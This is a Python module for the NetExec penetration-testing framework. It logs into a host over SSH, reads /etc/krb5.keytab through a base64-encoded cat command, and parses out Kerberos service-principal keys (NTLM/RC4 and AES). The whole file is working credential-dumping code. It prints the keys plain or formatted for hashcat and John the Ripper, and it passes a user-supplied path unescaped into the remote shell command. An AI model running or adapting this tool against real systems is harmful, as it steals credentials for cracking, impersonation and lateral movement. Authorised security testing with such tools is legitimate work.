import binascii
import datetime
import io
import logging
import os
import re
import tempfile
from abc import ABC, abstractmethod
from contextlib import redirect_stdout
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

from nxc.helpers.misc import CATEGORY

MAX_KEYTAB_SIZE: int = 100 * 1024 * 1024
HEADER_SIZE: int = 12
VERSION_FIELD_SIZE: int = 4
COMPONENT_COUNT_SIZE: int = 4
REALM_LENGTH_SIZE: int = 4
COMPONENT_LENGTH_SIZE: int = 4
TIMESTAMP_SIZE: int = 8
KVNO_SIZE: int = 2
KEYTYPE_SIZE: int = 4
KEYLEN_SIZE: int = 4
NAMETYPE_SIZE: int = 8

SUPPORTED_VERSIONS: list[str] = ["0501", "0502"]

HAS_COLOURS = False


class DummyFore:
    def __getattr__(self, name: str) -> str:
        return ""


class DummyStyle:
    def __getattr__(self, name: str) -> str:
        return ""


Fore = DummyFore()
Style = DummyStyle()

logger = logging.getLogger("keytabextract")


class HashFormat(Enum):
    """Output format for hashes."""

    PLAIN = "plain"
    HASHCAT = "hashcat"
    JOHN = "john"


class EncryptionType(Enum):
    """Supported encryption types."""

    RC4_HMAC = "0017"
    AES256_CTS_HMAC_SHA1 = "0012"
    AES128_CTS_HMAC_SHA1 = "0011"


@dataclass
class EncryptionInfo:
    """Information about an encryption type."""

    name: str
    display: str
    hash_length: int
    pattern_suffix: str


# Encryption type definitions
ENCRYPTION_TYPES: dict[str, EncryptionInfo] = {
    EncryptionType.RC4_HMAC.value: EncryptionInfo(
        name="RC4-HMAC", display="NTLM", hash_length=32, pattern_suffix="0010"
    ),
    EncryptionType.AES256_CTS_HMAC_SHA1.value: EncryptionInfo(
        name="AES256-CTS-HMAC-SHA1",
        display="AES-256",
        hash_length=64,
        pattern_suffix="0020",
    ),
    EncryptionType.AES128_CTS_HMAC_SHA1.value: EncryptionInfo(
        name="AES128-CTS-HMAC-SHA1",
        display="AES-128",
        hash_length=32,
        pattern_suffix="0010",
    ),
}


@dataclass
class KeyEntry:
    """Represents a single key entry from a keytab."""

    timestamp: int
    timestamp_str: str
    kvno: int
    encryption_type: str
    hash_value: str

    def __lt__(self, other: "KeyEntry") -> bool:
        """Sort by timestamp (newest first)."""
        return self.timestamp > other.timestamp


@dataclass
class ServicePrincipal:
    """Represents a service principal with its keys."""

    name: str
    realm: str
    keys: list[KeyEntry] = field(default_factory=list)

    def add_key(self, key: KeyEntry) -> None:
        """Add a key entry to this service principal.

        Args:
            key: KeyEntry to add
        """
        self.keys.append(key)
        self.keys.sort()


@dataclass
class KeytabData:
    """Container for all extracted keytab data."""

    version: str
    file_path: str
    principals: dict[str, ServicePrincipal] = field(default_factory=dict)

    def add_entry(self, realm: str, principal_name: str, key: KeyEntry) -> None:
        """Add a key entry to the appropriate service principal.

        Args:
            realm: Kerberos realm
            principal_name: Service principal name
            key: KeyEntry to add
        """
        full_name = f"{principal_name}@{realm}"
        if full_name not in self.principals:
            self.principals[full_name] = ServicePrincipal(
                name=principal_name, realm=realm
            )
        self.principals[full_name].add_key(key)


class KeyTabParser(ABC):
    """Abstract base class for version-specific keytab parsers."""

    @abstractmethod
    def extract_entry(
        self, hex_data: str, pointer: int
    ) -> tuple[tuple[str, str, KeyEntry] | None, int]:
        """Extract a single entry from the keytab.

        Returns:
            Tuple containing (realm, principal, key_entry) and new pointer position
        """


class KeyTabParserV0501(KeyTabParser):
    """Parser for keytab version 0501."""

    def extract_entry(
        self, hex_data: str, pointer: int
    ) -> tuple[tuple[str, str, KeyEntry] | None, int]:
        """Extract entry using v0501 format (without entry size fields)."""
        try:
            num_components = int(hex_data[pointer : pointer + COMPONENT_COUNT_SIZE], 16)
            pointer += COMPONENT_COUNT_SIZE

            realm_len = int(hex_data[pointer : pointer + REALM_LENGTH_SIZE], 16)
            pointer += REALM_LENGTH_SIZE

            realm_end = pointer + (realm_len * 2)
            realm = bytes.fromhex(hex_data[pointer:realm_end]).decode("utf-8")
            pointer = realm_end

            components = []
            for _ in range(num_components):
                comp_len = int(hex_data[pointer : pointer + COMPONENT_LENGTH_SIZE], 16)
                pointer += COMPONENT_LENGTH_SIZE
                comp_end = pointer + (comp_len * 2)
                component = bytes.fromhex(hex_data[pointer:comp_end]).decode("utf-8")
                components.append(component)
                pointer = comp_end

            service_principal = "/".join(components)
            pointer += NAMETYPE_SIZE

            timestamp = int(hex_data[pointer : pointer + TIMESTAMP_SIZE], 16)
            timestamp_str = datetime.datetime.fromtimestamp(timestamp).strftime(
                "%Y-%m-%d %H:%M:%S"
            )
            pointer += TIMESTAMP_SIZE

            kvno = int(hex_data[pointer : pointer + 2], 16)
            pointer += 2

            keytype_hex = hex_data[pointer : pointer + KEYTYPE_SIZE]
            pointer += KEYTYPE_SIZE

            key_len = int(hex_data[pointer : pointer + KEYLEN_SIZE], 16)
            pointer += KEYLEN_SIZE

            key_val_end = pointer + (key_len * 2)
            key_val = hex_data[pointer:key_val_end]
            pointer = key_val_end

            key = KeyEntry(
                timestamp=timestamp,
                timestamp_str=timestamp_str,
                kvno=kvno,
                encryption_type=keytype_hex,
                hash_value=key_val,
            )

            return (realm, service_principal, key), pointer

        except Exception as e:
            logger.debug(f"Error parsing v0501 entry at position {pointer}: {e!s}")
            return None, pointer + 8


class KeyTabParserV0502(KeyTabParser):
    """Parser for keytab version 0502."""

    def extract_entry(
        self, hex_data: str, pointer: int
    ) -> tuple[tuple[str, str, KeyEntry] | None, int]:
        """Extract entry using v0502 format."""
        try:
            num_components = int(hex_data[pointer : pointer + COMPONENT_COUNT_SIZE], 16)
            pointer += COMPONENT_COUNT_SIZE

            realm_len = int(hex_data[pointer : pointer + REALM_LENGTH_SIZE], 16)
            pointer += REALM_LENGTH_SIZE

            realm_end = pointer + (realm_len * 2)
            realm = bytes.fromhex(hex_data[pointer:realm_end]).decode("utf-8")
            pointer = realm_end

            components = []
            for _ in range(num_components):
                comp_len = int(hex_data[pointer : pointer + COMPONENT_LENGTH_SIZE], 16)
                pointer += COMPONENT_LENGTH_SIZE
                comp_end = pointer + (comp_len * 2)
                component = bytes.fromhex(hex_data[pointer:comp_end]).decode("utf-8")
                components.append(component)
                pointer = comp_end

            service_principal = "/".join(components)
            pointer += NAMETYPE_SIZE

            timestamp = int(hex_data[pointer : pointer + TIMESTAMP_SIZE], 16)
            timestamp_str = datetime.datetime.fromtimestamp(timestamp).strftime(
                "%Y-%m-%d %H:%M:%S"
            )
            pointer += TIMESTAMP_SIZE

            kvno = int(hex_data[pointer : pointer + KVNO_SIZE], 16)
            pointer += KVNO_SIZE

            keytype_hex = hex_data[pointer : pointer + KEYTYPE_SIZE]
            pointer += KEYTYPE_SIZE

            key_len = int(hex_data[pointer : pointer + KEYLEN_SIZE], 16)
            pointer += KEYLEN_SIZE

            key_val_end = pointer + (key_len * 2)
            key_val = hex_data[pointer:key_val_end]
            pointer = key_val_end

            key = KeyEntry(
                timestamp=timestamp,
                timestamp_str=timestamp_str,
                kvno=kvno,
                encryption_type=keytype_hex,
                hash_value=key_val,
            )

            pointer = self._skip_padding(hex_data, pointer)

            return (realm, service_principal, key), pointer

        except Exception as e:
            logger.debug(f"Error parsing entry at position {pointer}: {e!s}")
            return None, pointer + 8

    def _skip_padding(self, hex_data: str, pointer: int) -> int:
        """Skip padding bytes and alignment.

        Args:
            hex_data: Hex-encoded keytab data
            pointer: Current position in hex data

        Returns:
            int: New pointer position
        """
        try:
            if pointer + 8 <= len(hex_data):
                pointer += 8

            while pointer < len(hex_data) and hex_data[pointer : pointer + 2] == "00":
                pointer += 2

            if pointer < len(hex_data) and hex_data[pointer : pointer + 4] == "ffff":
                pointer += 8

        except ValueError:
            while pointer < len(hex_data) and hex_data[pointer : pointer + 2] == "00":
                pointer += 2

            if pointer < len(hex_data) and hex_data[pointer : pointer + 4] == "ffff":
                pointer += 8

        return pointer


class HashFormatter:
    """Formats hashes according to specified output format."""

    @staticmethod
    def format(
        hash_format: HashFormat,
        enc_type: str,
        hash_value: str,
        realm: str,
        service_principal: str,
    ) -> str:
        """Format a hash according to the specified output format.

        Args:
            hash_format: Output format type
            enc_type: Encryption type ID
            hash_value: Hash value to format
            realm: Kerberos realm
            service_principal: Service principal name

        Returns:
            str: Formatted hash string
        """
        if hash_format == HashFormat.PLAIN:
            return hash_value
        elif hash_format == HashFormat.HASHCAT:
            return HashFormatter._format_hashcat(
                enc_type, hash_value, realm, service_principal
            )
        elif hash_format == HashFormat.JOHN:
            return HashFormatter._format_john(
                enc_type, hash_value, realm, service_principal
            )
        return hash_value

    @staticmethod
    def _format_hashcat(
        enc_type: str, hash_value: str, realm: str, principal: str
    ) -> str:
        """Format for hashcat.

        Args:
            enc_type: Encryption type ID
            hash_value: Hash value
            realm: Kerberos realm
            principal: Service principal name

        Returns:
            str: Hashcat-formatted hash
        """
        if enc_type == EncryptionType.RC4_HMAC.value:
            return f"{hash_value}:{principal}"
        elif enc_type in (
            EncryptionType.AES256_CTS_HMAC_SHA1.value,
            EncryptionType.AES128_CTS_HMAC_SHA1.value,
        ):
            return f"{hash_value}:{principal}:{realm}"
        return hash_value

    @staticmethod
    def _format_john(enc_type: str, hash_value: str, realm: str, principal: str) -> str:
        """Format for John the Ripper.

        Args:
            enc_type: Encryption type ID
            hash_value: Hash value
            realm: Kerberos realm
            principal: Service principal name

        Returns:
            str: John-formatted hash
        """
        if enc_type == EncryptionType.RC4_HMAC.value:
            return f"{principal}:{hash_value}"
        elif enc_type in (
            EncryptionType.AES256_CTS_HMAC_SHA1.value,
            EncryptionType.AES128_CTS_HMAC_SHA1.value,
        ):
            return f"{principal}@{realm}:{hash_value}"
        return f"{principal}:{hash_value}"


class KeyTabExtractor:
    """Extract and process hashes from Kerberos keytab files."""

    def __init__(
        self,
        keytab_path: str,
        verbose: bool = False,
        no_colour: bool = False,
        hash_format: HashFormat = HashFormat.PLAIN,
        dry_run: bool = False,
    ):
        """Initialise the KeyTabExtractor.

        Args:
            keytab_path: Path to the keytab file
            verbose: Enable verbose output
            no_colour: Disable coloured output
            hash_format: Format for hash output
            dry_run: Analyse without extracting hashes
        """
        self.keytab_path: str = keytab_path
        self.hex_encoded: str = ""
        self.keytab_data: KeytabData | None = None
        self.verbose: bool = verbose
        self.use_colour: bool = HAS_COLOURS and not no_colour
        self.hash_format: HashFormat = hash_format
        self.dry_run: bool = dry_run
        self.parser: KeyTabParser | None = None

    def colour_text(self, text: str, colour: Any) -> str:
        """Apply colour to text if colours are enabled.

        Args:
            text: Text to colorize
            colour: Colorama colour object

        Returns:
            str: Colored or plain text
        """
        if self.use_colour:
            return f"{colour}{text}{Style.RESET_ALL}"
        return text

    def log_info(self, message: str) -> None:
        """Log an info message.

        Args:
            message: Message to log
        """
        logger.info(message)
        print(self.colour_text(f"[+] {message}", Fore.GREEN))

    def log_warning(self, message: str) -> None:
        """Log a warning message.

        Args:
            message: Message to log
        """
        logger.warning(message)
        print(self.colour_text(f"[!] {message}", Fore.YELLOW))

    def log_error(self, message: str) -> None:
        """Log an error message.

        Args:
            message: Message to log
        """
        logger.error(message)
        print(self.colour_text(f"[!] {message}", Fore.RED))

    def log_debug(self, message: str) -> None:
        """Log a debug message if verbose is enabled.

        Args:
            message: Message to log
        """
        logger.debug(message)
        if self.verbose:
            print(self.colour_text(f"[*] {message}", Fore.CYAN))

    def load_keytab(self) -> bool:
        """Load and validate the keytab file.

        Returns:
            bool: True if the file was successfully loaded, False otherwise
        """
        try:
            file_path = Path(self.keytab_path)

            if not file_path.exists():
                self.log_error(f"File '{self.keytab_path}' not found.")
                return False

            if not file_path.is_file():
                self.log_error(f"'{self.keytab_path}' is not a regular file.")
                return False

            with open(file_path, "rb") as f:
                data = f.read()

            if len(data) > MAX_KEYTAB_SIZE:
                self.log_error(
                    f"Keytab file exceeds maximum size of {MAX_KEYTAB_SIZE} bytes."
                )
                return False

            if len(data) < HEADER_SIZE:
                self.log_error("Keytab file is too small to be valid.")
                return False

            self.hex_encoded = binascii.hexlify(data).decode("utf-8")

            version = self.hex_encoded[:VERSION_FIELD_SIZE]
            if version not in SUPPORTED_VERSIONS:
                self.log_error(
                    f"Unsupported keytab version: {version}. "
                    f"Only versions {', '.join(SUPPORTED_VERSIONS)} are supported."
                )
                return False

            self.keytab_data = KeytabData(version=version, file_path=self.keytab_path)

            if version == "0501":
                self.parser = KeyTabParserV0501()
            else:
                self.parser = KeyTabParserV0502()

            self.log_info(
                f"Keytab file '{self.keytab_path}' successfully loaded (version {version})."
            )
            return True

        except PermissionError:
            self.log_error(f"Permission denied when accessing '{self.keytab_path}'.")
            return False
        except Exception as e:
            self.log_error(f"Error loading keytab file: {e!s}")
            return False

    def analyse_keytab(self) -> dict[str, Any]:
        """Analyse the keytab file structure without extracting hashes.

        Returns:
            Dictionary with analysis results
        """
        analysis: dict[str, Any] = {
            "version": self.keytab_data.version if self.keytab_data else "unknown",
            "file_size": len(self.hex_encoded) // 2 if self.hex_encoded else 0,
            "encryption_types": [],
            "entry_count": 0,
            "potential_principals": set(),
        }

        for enc_id, enc_info in ENCRYPTION_TYPES.items():
            enc_pattern = f"{enc_id}{enc_info.pattern_suffix}"
            if enc_pattern in self.hex_encoded:
                analysis["encryption_types"].append(enc_info.name)

        analysis["entry_count"] = sum(
            self.hex_encoded.count(enc_type) for enc_type in ENCRYPTION_TYPES
        )

        return analysis

    def detect_encryption_types(self) -> dict[str, bool]:
        """Detect supported encryption types in the keytab.

        Returns:
            Dict mapping encryption type IDs to boolean indicating presence
        """
        found_types: dict[str, bool] = {}

        for enc_id, enc_info in ENCRYPTION_TYPES.items():
            enc_pattern = f"{enc_id}{enc_info.pattern_suffix}"
            if enc_pattern in self.hex_encoded:
                self.log_info(
                    f"{enc_info.name} encryption detected. Will attempt to extract hash."
                )
                found_types[enc_id] = True
            else:
                self.log_debug(f"No {enc_info.name} encryption found.")
                found_types[enc_id] = False

        return found_types

    def verify_hash(self, enc_type: str, hash_value: str) -> bool:
        """Verify that a hash meets the expected format requirements.

        Args:
            enc_type: Encryption type ID
            hash_value: Hash value to verify

        Returns:
            bool: True if the hash is valid, False otherwise
        """
        if enc_type not in ENCRYPTION_TYPES:
            self.log_debug(f"Unknown encryption type: {enc_type}")
            return False

        expected_length = ENCRYPTION_TYPES[enc_type].hash_length
        if len(hash_value) != expected_length:
            self.log_debug(
                f"Invalid hash length for {ENCRYPTION_TYPES[enc_type].name}: "
                f"expected {expected_length}, got {len(hash_value)}"
            )
            return False

        try:
            bytes.fromhex(hash_value)
        except ValueError:
            self.log_debug(f"Invalid hex characters in hash: {hash_value}")
            return False

        return True

    def extract_entries(self) -> bool:
        """Extract all entries from the keytab file.

        Returns:
            bool: True if any entries were extracted, False otherwise
        """
        if self.dry_run:
            self.log_info("Dry-run mode: Analysing structure without extracting hashes")
            analysis = self.analyse_keytab()
            self.log_info("Analysis results:")
            self.log_info(f"  Version: {analysis['version']}")
            self.log_info(f"  File size: {analysis['file_size']} bytes")
            self.log_info(
                f"  Encryption types: {', '.join(analysis['encryption_types']) if analysis['encryption_types'] else 'None detected'}"
            )
            self.log_info(f"  Estimated entries: {analysis['entry_count']}")
            return analysis["entry_count"] > 0

        if not self.parser or not self.keytab_data:
            self.log_error("Parser not initialised.")
            return False

        pointer = HEADER_SIZE
        entry_count = 0

        try:
            while pointer < len(self.hex_encoded):
                result, new_pointer = self.parser.extract_entry(
                    self.hex_encoded, pointer
                )

                if result:
                    realm, principal, key_entry = result

                    if self.verify_hash(
                        key_entry.encryption_type, key_entry.hash_value
                    ):
                        self.keytab_data.add_entry(realm, principal, key_entry)
                        entry_count += 1
                    else:
                        self.log_warning(
                            f"Invalid hash found for {principal}, type {key_entry.encryption_type}"
                        )

                if new_pointer <= pointer:
                    self.log_warning(f"Parser stuck at position {pointer}. Stopping.")
                    break

                pointer = new_pointer

            self.log_info(f"Processed {entry_count} valid entries from keytab file.")
            return entry_count > 0

        except Exception as e:
            self.log_error(f"Error during extraction: {e!s}")
            return False

    def format_output(self, output_file: str | None = None) -> bool:
        """Format and display the extracted data.

        Args:
            output_file: Optional path to save results

        Returns:
            bool: True if successful, False otherwise
        """
        if self.dry_run:
            return True

        if not self.keytab_data or not self.keytab_data.principals:
            self.log_error("No valid entries found in keytab file.")
            return False

        output_lines: list[str] = []

        def add_line(line: str) -> None:
            output_lines.append(line)
            print(line)

        add_line("\n" + self.colour_text("=== KeyTabExtract Results ===", Fore.CYAN))
        add_line(f"File: {self.keytab_data.file_path}")
        add_line(f"Version: {self.keytab_data.version}")
        add_line("")

        for principal_name in sorted(self.keytab_data.principals.keys()):
            principal = self.keytab_data.principals[principal_name]
            add_line(self.colour_text(f"Realm: {principal.realm}", Fore.MAGENTA))
            add_line(
                self.colour_text(f"  Service Principal: {principal.name}", Fore.BLUE)
            )

            for key in principal.keys:
                add_line(
                    self.colour_text(
                        f"    Timestamp: {key.timestamp_str} (KVNO: {key.kvno})",
                        Fore.YELLOW,
                    )
                )

                enc_info = ENCRYPTION_TYPES.get(key.encryption_type)
                display_name = (
                    enc_info.display if enc_info else f"Type-{key.encryption_type}"
                )

                formatted_hash = HashFormatter.format(
                    self.hash_format,
                    key.encryption_type,
                    key.hash_value,
                    principal.realm,
                    principal.name,
                )

                add_line(f"      {display_name}: {formatted_hash}")

        if output_file:
            try:
                output_path = Path(output_file)
                output_path.parent.mkdir(parents=True, exist_ok=True)

                with open(output_path, "w") as f:
                    for line in output_lines:
                        clean_line = re.sub(r"\x1b\[[0-9;]+m", "", line)
                        f.write(clean_line + "\n")

                self.log_info(f"Results saved to {output_file}")
                return True

            except Exception as e:
                self.log_error(f"Error saving to file: {e!s}")
                return False

        return True

    def run(self, output_file: str | None = None) -> int:
        """Main execution flow.

        Args:
            output_file: Optional path to save results

        Returns:
            int: Exit code (0 for success, non-zero for errors)
        """
        if not self.load_keytab():
            return 1

        if not self.detect_encryption_types():
            self.log_warning("No supported encryption types found.")
            return 1

        if not self.extract_entries():
            if not self.dry_run:
                self.log_error("Failed to extract entries from keytab file.")
            return 1

        if not self.format_output(output_file):
            return 1

        return 0


class NXCModule:
    """
    Extracts Kerberos keys/hashes from /etc/krb5.keytab via SSH.

    Module by @sttlr, original keytabextract code from https://github.com/ZephrFish/KeyTabExtract
    """

    name = "keytabextract"
    description = "Extract keys/hashes from /etc/krb5.keytab"
    supported_protocols = ["ssh"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self):
        self.context = None
        self.module_options = None
        self.keytab_path = "/etc/krb5.keytab"
        self.hash_format = "plain"
        self.allowed_formats = ["plain", "hashcat", "john"]

    def options(self, context, module_options):
        """
        PATH    Remote path to the keytab file (default: /etc/krb5.keytab)
        FORMAT  Output format: plain, hashcat, john (default: plain)
        """
        if "PATH" in module_options:
            self.keytab_path = module_options["PATH"]
        if "FORMAT" in module_options:
            user_format = module_options["FORMAT"].lower()
            if user_format in self.allowed_formats:
                self.hash_format = user_format
            else:
                context.log.error(
                    f"Invalid FORMAT '{user_format}'. Allowed: {', '.join(self.allowed_formats)}"
                )
                exit(1)

    def on_login(self, context, connection):
        context.log.display(f"Reading {self.keytab_path}")

        cmd = f"cat {self.keytab_path} | base64"
        b64_output = connection.execute(cmd)

        if (
            not b64_output
            or "base64: not found" in b64_output
            or "No such file" in b64_output
        ):
            context.log.fail(
                f"Could not read {self.keytab_path}. Permissions or missing base64 binary?"
            )
            return

        try:
            raw_data = binascii.a2b_base64(
                b64_output.replace("\n", "").replace("\r", "")
            )
        except Exception as e:
            context.log.fail(f"Failed to decode keytab data: {e}")
            return

        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            local_path = tmp.name
            tmp.write(raw_data)

        try:
            h_format = HashFormat(self.hash_format)

            extractor = KeyTabExtractor(
                local_path,
                verbose=False,
                no_colour=True,
                hash_format=h_format,
                dry_run=False,
            )

            # 4. Capture the tool's print statements
            f = io.StringIO()
            with redirect_stdout(f):
                extractor.run()

            results = f.getvalue().strip()

            if results:
                for line in results.splitlines():
                    context.log.highlight(line)
            else:
                context.log.fail("Parsed the file, but no entries were found.")

        except Exception as e:
            context.log.fail(f"Module logic error: {e!s}")

        finally:
            if os.path.exists(local_path):
                os.remove(local_path)
